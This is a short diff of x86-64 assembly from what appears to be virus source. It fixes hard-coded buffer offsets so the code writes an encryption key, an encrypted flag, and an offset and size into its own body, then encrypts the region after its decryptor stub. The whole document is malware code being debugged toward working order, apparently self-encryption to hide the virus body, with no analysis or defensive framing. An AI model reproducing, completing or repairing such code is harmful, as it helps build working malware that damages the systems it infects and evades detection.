@@ -151,9 +151,9 @@ _start:
     call generate_key
     
     ; Write key to encryption_key location in buffer
-    ; encryption_key is at virus_start + 8 = 0x13ce
+    ; encryption_key is at virus_start + 8 = 0x139b (0x1393 + 8)
     lea rdi, [rel file_buffer]
-    add rdi, 0x13ce
+    add rdi, 0x139b
     lea rsi, [rel key_buffer]
     mov rcx, KEY_SIZE
 .write_key:
@@ -165,22 +165,22 @@ _start:
     test rcx, rcx
     jnz .write_key
     
-    ; Set encrypted flag at virus_start + 24 = 0x13de
+    ; Set encrypted flag at virus_start + 24 = 0x13ab (0x1393 + 24 = 0x13ab)
     mov byte [rdi], 1
     
-    ; Write encrypted_offset at virus_start + 25 = 0x13df
+    ; Write encrypted_offset at virus_start + 25 = 0x13ac
     ; Store as offset from virus_start, not absolute file offset
-    ; virus_start = 0x13c6, decrypt_code.end = 0x15a3
-    ; offset_from_virus_start = 0x15a3 - 0x13c6 = 0x1dd
+    ; virus_start = 0x1393, decrypt_code.end = 0x1570
+    ; offset_from_virus_start = 0x1570 - 0x1393 = 0x1dd
     mov qword [rdi + 1], 0x1dd
     
-    ; Write encrypted_size at virus_start + 33 = 0x13e7
+    ; Write encrypted_size at virus_start + 33 = 0x13b4
     ; Size = 0x637 bytes
     mov qword [rdi + 9], 0x637
     
-    ; Encrypt from decrypt_code.end (0x15a3) for 0x637 bytes
+    ; Encrypt from decrypt_code.end (0x1570) for 0x637 bytes
     lea rdi, [rel file_buffer]
-    add rdi, 0x15a3
+    add rdi, 0x1570
     mov rsi, 0x637
     call encrypt_buffer
     
